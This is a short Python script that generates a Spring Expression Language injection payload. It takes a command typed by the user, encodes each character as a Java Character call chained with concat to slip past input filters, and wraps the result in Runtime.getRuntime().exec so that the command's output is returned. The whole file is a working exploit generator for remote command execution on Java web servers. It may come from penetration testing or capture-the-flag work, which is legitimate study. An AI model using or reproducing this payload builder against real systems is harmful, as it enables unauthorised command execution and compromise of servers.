user_input = input("Enter string: ")

first_byte = user_input[0]
last_byte = user_input[len(user_input) - 1]

payload = ""
payload += "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(" + str(ord(first_byte)) + ")"

for i in range(1, len(user_input)):
	payload += ".concat(T(java.lang.Character).toString(" + str(ord(user_input[i])) + "))"

payload += ").getInputStream())}"

print(payload)
